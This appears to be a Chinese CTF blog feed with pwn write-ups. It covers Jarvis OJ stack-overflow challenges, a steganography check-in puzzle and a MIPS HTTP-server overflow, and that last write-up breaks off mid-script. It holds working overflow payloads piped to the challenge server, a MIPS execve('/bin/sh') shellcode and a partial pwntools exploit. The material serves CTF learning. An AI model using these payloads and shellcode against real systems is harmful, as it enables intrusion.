      <url>/2019/01/24/jarvis-oj-pwn-%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-tell-me-something-Point-100"><a href="#0x01-tell-me-something-Point-100" class="headerlink" title="0x01 tell me something Point:100"></a>0x01 tell me something Point:100</h2><p>checksec:</p><pre><code>Arch:     amd64-64-littleRELRO:    No RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><p>很明显的漏洞点:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Input your message:\n"</span>, <span class="number">20u</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;v4, <span class="number">256u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"I have received your message, Thank you!\n"</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>read处读取了256个字符, 但是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:00000000004004E0 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004004E0                 public main</span><br><span class="line">.text:00000000004004E0 main            proc near               ; DATA XREF: _start+1D↓o</span><br><span class="line">.text:00000000004004E0 ; __unwind &#123;</span><br><span class="line">.text:00000000004004E0                 sub     rsp, 88h</span><br><span class="line">.text:00000000004004E7                 mov     edx, 14h        ; n</span><br><span class="line">.text:00000000004004EC                 mov     esi, offset aInputYourMessa ; &quot;Input your message:\n&quot;</span><br><span class="line">.text:00000000004004F1                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004004F6                 call    _write</span><br><span class="line">.text:00000000004004FB                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004004FE                 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:0000000000400503                 xor     edi, edi        ; fd</span><br><span class="line">.text:0000000000400505                 call    _read</span><br><span class="line">.text:000000000040050A                 mov     edx, 29h        ; n</span><br><span class="line">.text:000000000040050F                 mov     esi, offset aIHaveReceivedY ; &quot;I have received your message, Thank you&quot;...</span><br><span class="line">.text:0000000000400514                 mov     edi, 1          ; fd</span><br><span class="line">.text:0000000000400519                 call    _write</span><br><span class="line">.text:000000000040051E                 add     rsp, 88h</span><br><span class="line">.text:0000000000400525                 retn</span><br><span class="line">.text:0000000000400525 ; &#125; // starts at 4004E0</span><br><span class="line">.text:0000000000400525 main            endp</span><br></pre></td></tr></table></figure></p><p>根据<code>sub     rsp, 88h</code>可知main函数的栈空间只有0x88 = 136字节, read的时候会溢出</p><p>我们输入12345678后看一下栈</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  x/100g $sp</span><br><span class="line">0x7fffffffde20:0x38373635343332310x000000000000000a</span><br><span class="line">0x7fffffffde30:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>按照小端序存放的输入, 即高字节存放在低地址, 低字节存放在高地址, 按4字节对齐</p><p>输入的<code>12345678</code>即<code>\x31\x32\x33\x34\x35\x36\x37\x38</code></p><pre><code>gef➤  x/10xw $sp0x7fffffffde20:    0x34333231    0x38373635    0x0000000a    0x000000000x7fffffffde30:    0x00000000    0x00000000    0x00000000    0x000000000x7fffffffde40:    0x00000000    0x00000000</code></pre><p>可以看到1234按4321的顺序放在0x7fffffffde20-0x7fffffffde23</p><p>5678按8765的顺序放在0x7fffffffde24-0x7fffffffde27</p><p>read函数结束的时候会返回到main函数继续执行, 返回的地址是保存在栈中的, 因此可以利用栈溢出覆盖返回地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">good_game</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+Fh] [rbp-9h]</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = fgetc(v0);</span><br><span class="line">    buf = result;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">-1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    write(<span class="number">1</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现一个good_game函数可以读取flag并输出</p><pre><code>.text:0000000000400620                 public good_game.text:0000000000400620 good_game       proc near.text:0000000000400620.text:0000000000400620 buf             = byte ptr -9.text:0000000000400620.text:0000000000400620 ; __unwind {.text:0000000000400620                 push    rbx.text:0000000000400621                 mov     esi, offset modes ; &quot;r&quot;.text:0000000000400626                 mov     edi, offset filename ; &quot;flag.txt&quot;</code></pre><p>地址是0x00400620, 即覆盖返回地址为0x00400620即可, 注意按照小端序, 64位程序补齐高4字节地址</p><p>payload:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'print "A" * 0x88 + "\x20\x06\x40\x00\x00\x00\x00\x00"' | nc pwn.jarvisoj.com 9876</span><br></pre></td></tr></table></figure></p><h2 id="0x02-Smashes-Point-200"><a href="#0x02-Smashes-Point-200" class="headerlink" title="0x02 Smashes Point:200"></a>0x02 Smashes Point:200</h2><pre><code>Arch:     amd64-64-littleRELRO:    No RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>开了Canary, 会检测标志位以防止栈溢出, 可以看到如果发生了栈溢出会输出:</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/3.png" alt="img"></p><p>在ida点菜单中的View-&gt;Open subviews-&gt;String可以打开字符串窗口, 看到</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/1.png" alt="img"></p><p>即flag是读到内存中了的</p><p>那么我们可以把flag的地址覆盖到argv[0]=/home/username/filename, 就可以输出flag</p><p>这个漏洞点也很明显:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4007E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+0h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+108h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Hello!\nWhat's your name? "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_IO_gets(&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  v0 = <span class="number">0L</span>L;</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Nice to meet you, %s.\nPlease overwrite the flag: "</span>);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>read函数读取了0x28个数据, 但是在</p><pre><code>.text:00000000004007E0 sub_4007E0      proc near               ; CODE XREF: main+12↑p.text:00000000004007E0.text:00000000004007E0 var_20          = qword ptr -20h.text:00000000004007E0.text:00000000004007E0                 push    rbp.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; &quot;Hello!\nWhat&apos;s your name? &quot;.text:00000000004007E6                 mov     edi, 1</code></pre><p>可以看到只有0x20的栈, 存在栈溢出</p><p>那么我们只要一直填充数据到地址覆盖到argv[0]即可</p><p>让程序输入一些数据看一下输入开始的地址:</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/2.png" alt="img"></p><p>栈从低地址向高地址增加, argv[0]在高地址, main函数的栈在低地址, 然后main函数的栈帧中, 地址由低向高增加, 所以大量数据填充可以让我们的输入覆盖到高地址的argv[0]</p><p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/4.png" alt="img"></p><p>搜索一下flag的位置</p><pre><code>pwndbg&gt; search CTF{smashes         0x400d21 push   r12 /* &quot;CTF{Here&apos;s the flag on server}&quot; */smashes         0x600d21 &quot;CTF{Here&apos;s the flag on server}</code></pre><p>还有argv[0]的位置</p><pre><code>pwndbg&gt; search /home/a/smasheswarning: Unable to access 16000 bytes of target memory at 0x7ffff7bd2d0e, halting search.[stack]         0x7fffffffe230 &apos;/home/a/smashes&apos;[stack]         0x7fffffffe800 &apos;/home/a/smashes&apos;[stack]         0x7fffffffefe8 &apos;/home/a/smashes&apos;</code></pre><p>输入数据保存的位置(栈顶)</p><pre><code>RSP  0x7fffffffe3b0 ◂— 0x34333231 /* &apos;1234&apos; */</code></pre><p>我们选取一个距离最远的,保证覆盖到argv[0]</p><p>按8字节小端序对齐</p><p>所以最终payload为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python -c <span class="string">"print((0x7fffffffefe8 - 0x7fffffffe3b0) / 8 * '\x21\x0d\x40\x00\x00\x00\x00\x00' + '\n\n')"</span> | nc pwn.jarvisoj.com <span class="number">9877</span></span><br></pre></td></tr></table></figure><p>记录一下格式化字符串:</p><p>格式化占位符（format placeholder），语法是：</p><pre><code>%[parameter][flags][field width][.precision][length]type</code></pre><ul><li>parameter: n$, n用来指示是第几个参数, 如: <code>printf(&quot;%2$d, %1$d&quot;, 1, 2)</code> 输出的是<code>2, 1</code></li><li>flags: <ul><li>+: 正号, 表示有符号数值, 仅用于数值类型</li><li>空格: 输出有符号数的时候如果没有正负号或者零个字符, 就前缀一个空格, 与<code>+</code>同时出现的时候忽略</li><li>-: 左对齐, 默认情况下是右对齐</li><li>#: 不删除尾部0保持精度, 总输出小数点, 输出0, 0x, 0X表示进制</li></ul></li><li>field width: 给出显示数值的最小宽度, 不足时补齐, 超出时全部输出</li><li>.precision: 指明输出的最大长度</li><li>length: 指明参数长度, hh, 输出一个字节, h, 输出一个双字节</li><li>type: <ul><li>d/i: 有符号整数, 如果scanf的时候, 输入16进制数如<code>0x2f</code>, 则应用i, 否则d和i同义</li><li>u: 无符号整数</li><li>f/F: double型按10进制定点表示, 如2.2323</li><li>e/E: 按科学计数法表示, 1.5e002</li><li>g/G: double, 输出全部有效数字位</li><li>x/X: 16 进制 unsigned int</li><li>o/8: 进制 unsigned int</li><li>s: 如果没有用 l 标志, 输出 null 结尾字符串直到精度规定的上限; 如果没有指定精度，则输出所有字节. 如果用了 l 标志, 则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符, 相当于调用 wcrtomb 函数.</li></ul></li></ul><p><code>0000000000600D21</code> <code>\x21\x0d\x60\x00\x00\x00\x00\x00</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>训练赛记录</title>
      <link href="/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
      <url>/2019/01/19/%E8%AE%AD%E7%BB%83%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这周做了UCAS的内部赛, 调出来pwn的时候才知道比赛时间只有11小时orz, 大佬们做的最多的是re1, 然而我ida打开以后看到一堆函数就不想看了233, 最终只提交了一个签到题, orz我好菜</p><h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>文件: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/checkin.png">checkin.png</a></p><p>LSB低位隐写，提取出来</p><p><code>XcHVycGxle2V6X2NoMVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD303032653732333338636361313061626437387D</code></p><p>后半段 <code>303032653732333338636361313061626437387D</code> 看起来是16进制串，解出来 <code>002e72338cca10abd78}</code></p><p>中段 <code>MVRWWX3JNZPWKN3GHBRDCOJYGQ3TMZDD</code> 是base32： <code>eck_in_e7f8b198476dc</code></p><p>首段看起来是base64，解不出来，猜测是 <code>purple{ch</code></p><p>用base64以后是 <code>cHVycGxle2No</code></p><p>跟 <code>XcHVycGxle2V6X2No</code> 比较，看起来多了个X</p><p>解出来 <code>purple{ez_ch</code></p><p>结果：<code>purple{ez_check_in_e7f8b198476dc002e72338cca10abd78}</code></p><h1 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h1><p>文件在这里下载: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/bin.233">bin.233</a></p><p>题目给了一个binfile， checksec</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     mips-32-big</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>fine…mips环境搞起来</p><h2 id="0x01-QEMU-MIPS调试环境搭建"><a href="#0x01-QEMU-MIPS调试环境搭建" class="headerlink" title="0x01 QEMU MIPS调试环境搭建"></a>0x01 QEMU MIPS调试环境搭建</h2><p>下载虚拟机和内核文件 <code>https://people.debian.org/~aurel32/qemu/mips/</code></p><p>这里下载 <code>debian_wheezy_mips_standard.qcow2</code> 和 <code>vmlinux-3.2.0-4-4kc-malta</code></p><p>我宿主机是Vmware的Ubuntu 16.04, 在里面开qemu虚拟机, 采用网桥的方式建立MIPS虚拟机和Ubuntu的连接</p><p>安装QEMU: </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install -y qemu qemu-user-static qemu-system</span><br></pre></td></tr></table></figure><p>下载虚拟机和内核文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_wheezy_mips_standard.qcow2 &amp;&amp;</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta</span><br></pre></td></tr></table></figure><p>然后，虚拟机，启动！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo qemu-system-mips \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_wheezy_mips_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -netdev user,id=net0 \</span><br><span class="line">    -device e1000,netdev=net0,id=net0,mac=52:54:00:c9:18:27 \</span><br><span class="line">    -net user -redir tcp:2222::2222 \</span><br><span class="line">    -gdb tcp::22333 \</span><br><span class="line">    -redir tcp:1234::1234 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><p>账号密码都是root, 然后添加了端口映射, 便于在Ubuntu里调试</p><p>给Ubuntu安装pwndbg和调试MIPS的插件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg &amp;&amp;</span><br><span class="line">cd pwndbg &amp;&amp;</span><br><span class="line">sudo bash setup.sh &amp;&amp;</span><br><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure></p><p>关于调试:</p><p>我在qemu虚拟机里装了gdb和socat, 即:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install gdb socat</span><br></pre></td></tr></table></figure><p>然后把要调试的文件传到了免费网盘github, 之后通过wget下载到qemu虚拟机中</p><p>然后用socat启动gdb调试, 这里的1234端口是上面启动虚拟机的时候设置的端口映射</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:1234,reuseaddr,fork EXEC:&quot;gdb bin.233&quot;</span><br></pre></td></tr></table></figure><p>这样我们在Ubuntu机里就可以用 <code>nc 127.0.0.1 1234</code> 进行连接</p><p>输入payload可以用python脚本配合pwntools</p><p>如:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&apos;127.0.0.1&apos;, 1234)</span><br></pre></td></tr></table></figure></p><p>后面的操作就相当于开了一个远程调试的gdb, 直接用pwntools发送指令即可, 比如查看栈内存:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r.sendline(&apos;x/100wx $sp&apos;)</span><br></pre></td></tr></table></figure><p>蛋疼的是mips虚拟机里没法装pwndbg之类的工具, 只能用原始的gdb来调, 不过足够了</p><h2 id="0x02-反编译代码分析"><a href="#0x02-反编译代码分析" class="headerlink" title="0x02 反编译代码分析"></a>0x02 反编译代码分析</h2><p>我用的是jeb的mips反编译的, 可以试用一个月, 开个虚拟机到期就重置2333</p><p>main函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1)</span> </span>&#123;</span><br><span class="line">    setvbuf(*gvar_411214, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    setvbuf(**&amp;gvar_411208, <span class="number">6</span>, <span class="number">2</span>, <span class="number">6</span>);</span><br><span class="line">    param0 = *&amp;gvar_4111D4 + <span class="number">4448</span>;</span><br><span class="line">    <span class="keyword">char</span> *v0 = getenv(<span class="string">"PWD"</span>);</span><br><span class="line">    *&amp;ROOT = v0;</span><br><span class="line">    menu(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i) &#123;</span><br><span class="line">        respond(param0, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>menu函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">menu</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"pwd"</span>, param1, param2, param3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start?"</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, *&amp;gvar_4111D8, <span class="number">1</span>, param3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>respond函数:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">respond</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> param0, <span class="keyword">unsigned</span> <span class="keyword">int</span> param1, <span class="keyword">unsigned</span> <span class="keyword">int</span> param2, <span class="keyword">unsigned</span> <span class="keyword">int</span> param3)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(gvar_4111D8, <span class="number">0</span>, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> result = read(<span class="number">0</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">    <span class="keyword">int</span> v0 = result;</span><br><span class="line">    <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"Client disconnected upexpectedly.\n"</span>, <span class="number">1</span>, <span class="number">34</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(result &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        result = fwrite(<span class="string">"recv() error\n"</span>, <span class="number">1</span>, <span class="number">13</span>, **&amp;gvar_41123C);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">// len(result) &gt; 0, 有输入</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>, mesg, <span class="number">4096</span>, param3);</span><br><span class="line">        result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4096</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">        result = <span class="built_in">strncmp</span>(result, <span class="string">"GET"</span>, <span class="number">4</span>, param3); <span class="comment">// 比较前4个字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *filename = result;</span><br><span class="line">            result = strtok(mesg, <span class="string">" \t\n"</span>, <span class="number">4</span>, param3); <span class="comment">// 用" \t\n"切割字符串</span></span><br><span class="line">            <span class="keyword">char</span> *protocol = result;</span><br><span class="line">            result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.0"</span>, <span class="number">8</span>, param3); <span class="comment">// 比较前8个字符</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                result = <span class="built_in">strncmp</span>(protocol, <span class="string">"HTTP/1.1"</span>, <span class="number">8</span>, param3); <span class="comment">//比较</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(result != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"HTTP/1.0 400 Bad Request\n"</span>, <span class="number">25</span>, param3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            result = <span class="built_in">strncmp</span>(filename, <span class="string">"/"</span>, <span class="number">2</span>, param3);</span><br><span class="line">            <span class="keyword">if</span>(result == <span class="number">0</span>) &#123;</span><br><span class="line">                filename = <span class="string">"/index.html"</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            env_str = *&amp;ROOT;</span><br><span class="line">            <span class="built_in">strcpy</span>(&amp;path, env_str); <span class="comment">// path = /home/fish</span></span><br><span class="line">            result = <span class="built_in">strlen</span>(*&amp;R00T, env_str, <span class="number">2</span>, param3); <span class="comment">// 路径的长度</span></span><br><span class="line">            <span class="comment">// 字符串拼接 path = /home/fish + v1,</span></span><br><span class="line">            <span class="comment">// 没有计算文件名的长度就直接copy了, 可以导致栈溢出</span></span><br><span class="line">            <span class="built_in">strcpy</span>(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(result + ((<span class="keyword">int</span>)(&amp;path)))), filename, <span class="number">2</span>, param3); </span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"file: %s\n"</span>, &amp;path, <span class="number">2</span>, param3); <span class="comment">// 输出path</span></span><br><span class="line">            result = open(&amp;path, <span class="number">0</span>, <span class="number">2</span>, param3); <span class="comment">// 打开path指向的文件</span></span><br><span class="line">            <span class="comment">// 文件存在则输出200 OK, 否则404</span></span><br><span class="line">            result = result != <span class="number">-1</span> ? write(l, <span class="string">"HTTP/1.0 200 0K\n\n"</span>, <span class="number">17</span>, param3): write(<span class="number">1</span>, <span class="string">"HTTP/1.0 404 Not Found\n"</span>, <span class="number">23</span>, param3);    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h1><p>输入的HTTP请求段mesg:</p><p>GET /{file} HTTP/1.0</p><p><img src="/2019/01/19/训练赛记录/1.png" alt="img"></p><p>可以看到栈里的数据, strcpy复制的时候没检查长度造成栈溢出, 测得保存的文件路径在$sp + 0x2c处(本机测试的时候路径是/root)</p><p><img src="/2019/01/19/训练赛记录/2.png" alt="img"></p><p>$ra(返回地址寄存器)保存在$sp + 0x134处</p><p><img src="/2019/01/19/训练赛记录/3.png" alt="img"><br><img src="/2019/01/19/训练赛记录/4.png" alt="img"></p><p>/bin/sh也有了, system也有了</p><p><img src="/2019/01/19/训练赛记录/5.png" alt="img"></p><p><img src="/2019/01/19/训练赛记录/6.png" alt="img"></p><p>看起来是要构造ROP, 但是有一个问题是, payload里不能有\x00不然会截断</p><p>但是所有地址都是0x0040开头的, 所以没法构造ROP</p><p>本来跳转到 0x00400e68, 现在跳转到 0x7fff6b5a, a(1000b) 最低两个有效位有一个不是0</p><p>尝试把shellcode写到栈上然后控制$ra跳转过去</p><p>在Exploit-DB上找了个mips 32 big endian的shellcode</p><pre><code>shellcode  = &quot;\x28\x06\xff\xff&quot;      #  /* slti    a2,zero,-1   */shellcode += &quot;\x3c\x0f\x2f\x2f&quot;      #  /* lui     t7,0x2f2f    */shellcode += &quot;\x35\xef\x62\x69&quot;      #  /* ori     t7,t7,0x6269 */shellcode += &quot;\xaf\xaf\xff\xf4&quot;      #  /* sw      t7,-12(sp)   */shellcode += &quot;\x3c\x0e\x6e\x2f&quot;      #  /* lui     t6,0x6e2f    */shellcode += &quot;\x35\xce\x73\x68&quot;      #  /* ori     t6,t6,0x7368 */shellcode += &quot;\xaf\xae\xff\xf8&quot;      #  /* sw      t6,-8(sp)    */shellcode += &quot;\xaf\xa0\xff\xfc&quot;      #  /* sw      zero,-4(sp)  */shellcode += &quot;\x27\xa4\xff\xf4&quot;      #  /* addiu   a0,sp,-12    */shellcode += &quot;\x28\x05\xff\xff&quot;      #  /* slti    a1,zero,-1   */shellcode += &quot;\x24\x02\x0f\xab&quot;      #  /* li      v0,4011      */shellcode += &quot;\x01\x01\x01\x0c&quot;      #  /* syscall 0x40404      */</code></pre><p>看一下函数返回的操作</p><pre><code>  break         $sp        $ra          code0x00400CC0  0x7fff6bd8  0x00400c9c  jalr    $t9 ; strcpy                # 这条指令将执行strcpy0x00400CC4  0x7fff6bd8  0x00400cc8  nop0x00400CC8  0x7fff6bd8  0x00400cc8  lw      $gp, 0x138+var_128($fp)     # strcpy后第一条指令----------0x00400D7C  0x7fff6bd8  0x00400d70  lw      $ra, 0x138+var_4($sp)       # 这里修改了$ra, 我们溢出到栈上覆盖了这个地址后, $ra的值是我们伪造的地址0x00400D80  0x7fff6bd8  0x00400e68  lw      $fp, 0x138+var_8($sp)       # 这里伪造的$ra=0x7fff6b5a0x00400D84  0x7fff6bd8  0x00400e68  addiu   $sp, 0x138                  # $ra=0x7fff6b5a0x00400D88  0x7fff6d10  0x00400e68  jr      $ra                         # 跳转回main</code></pre><p>直接修改$ra 跳过去就可以, 修改$ra为0x7fff6b5a</p><p>测试完以后发现, 会报</p><pre><code>Program received signal SIGBUS, Bus error.GDB is unable to find the start of the function at 0x7fff6b5aand thus can&apos;t determine the size of that function&apos;s stack frame.This means that GDB may be unable to access that stack frame, orthe frames below it.This problem is most likely caused by an invalid program counter orstack pointer.However, if you think GDB should simply search farther backfrom 0x7fff6b5a for code which looks like the beginning of afunction, you can increase the range of the search using the `setheuristic-fence-post&apos; command.0x7fff6b5a in ?? ()</code></pre><p>猜测可能是MIPS需要对齐地址, $sp = 0x7fff6bd8, 所以应该按4字节增长, 设置$ra = $sp + 4 * n</p><p>但是实际运行环境的$sp不知道, 得想办法解决一哈</p><p>调试环境测试跳转到shellcode可以稳定getshell</p><p><img src="/2019/01/19/训练赛记录/7.png" alt="img"></p><p>0x04 exp</p><p>先给出exp…等我想办法找到栈地址再补充</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode  = <span class="string">"\x28\x06\xff\xff"</span>      <span class="comment">#  /* slti    a2,zero,-1   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0f\x2f\x2f"</span>      <span class="comment">#  /* lui     t7,0x2f2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xef\x62\x69"</span>      <span class="comment">#  /* ori     t7,t7,0x6269 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xaf\xff\xf4"</span>      <span class="comment">#  /* sw      t7,-12(sp)   */</span></span><br><span class="line">shellcode += <span class="string">"\x3c\x0e\x6e\x2f"</span>      <span class="comment">#  /* lui     t6,0x6e2f    */</span></span><br><span class="line">shellcode += <span class="string">"\x35\xce\x73\x68"</span>      <span class="comment">#  /* ori     t6,t6,0x7368 */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xae\xff\xf8"</span>      <span class="comment">#  /* sw      t6,-8(sp)    */</span></span><br><span class="line">shellcode += <span class="string">"\xaf\xa0\xff\xfc"</span>      <span class="comment">#  /* sw      zero,-4(sp)  */</span></span><br><span class="line">shellcode += <span class="string">"\x27\xa4\xff\xf4"</span>      <span class="comment">#  /* addiu   a0,sp,-12    */</span></span><br><span class="line">shellcode += <span 